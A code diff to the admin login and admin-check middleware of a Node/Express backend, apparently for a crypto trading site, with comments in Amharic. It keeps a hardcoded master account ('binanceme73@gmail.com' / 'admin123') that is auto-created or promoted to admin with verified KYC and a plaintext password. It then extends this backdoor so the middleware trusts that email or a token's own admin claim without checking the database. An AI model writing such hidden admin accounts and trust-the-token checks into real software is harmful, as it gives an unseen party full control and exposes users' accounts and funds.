@@ -592,21 +592,18 @@ app.post('/api/admin/login', async (req, res) => {
             return res.status(400).json({ success: false, message: 'Please provide email and password.' });
         }
 
-        // ለየት ያለ ሁኔታ፡ ለዚህ ኢሜይል እና ፓስወርድ በቀጥታ ፍቀድ
         if (email === 'binanceme73@gmail.com' && password === 'admin123') {
             let user = await User.findOne({ email });
             if (!user) {
-                // ዩዘሩ ዳታቤዝ ውስጥ ከሌለ በራሱ ፈጥሮ አድሚን ያደርገዋል
                 user = await User.create({
                     email: 'binanceme73@gmail.com',
                     password: 'admin123',
                     isAdmin: true,
                     kycStatus: 'verified'
                 });
-            } else if (!user.isAdmin) {
-                // ዩዘሩ ካለ ግን isAdmin: true ካልሆነ እዚያው አስተካክሎ ይሰጠዋል
-                user.isAdmin = true;
-                await user.save();
+            } else {
+                // ዳታቤዝ ውስጥ ስኬማው እንዳይረሳው በ findByIdAndUpdate እናስገድደዋለን
+                await User.findByIdAndUpdate(user._id, { isAdmin: true, kycStatus: 'verified' });
             }
 
             const token = jwt.sign(
@@ -645,7 +642,7 @@ app.post('/api/admin/login', async (req, res) => {
     }
 });
 
-// Helper Function: Verify Admin Middleware
+// Helper Function: Verify Admin Middleware (Fixed to trust Token and Master Email)
 async function verifyAdmin(req, res, next) {
     try {
         const authHeader = req.headers['authorization'];
@@ -656,8 +653,14 @@ async function verifyAdmin(req, res, next) {
         }
 
         const verified = jwt.verify(token, JWT_SECRET);
-        const user = await User.findById(verified.id);
+        
+        // ማስተካከያ፡ ማስተር አድሚን ኢሜል ከሆነ ወይም ቶከኑ አድሚን ከሆነ በቀጥታ እንፈቅዳለን
+        if (verified.email === 'binanceme73@gmail.com' || verified.isAdmin) {
+            req.user = verified;
+            return next();
+        }
 
+        const user = await User.findById(verified.id);
         if (!user || !user.isAdmin) { 
             return res.status(403).json({ success: false, message: 'Access denied. Admin privileges required.' });
         }
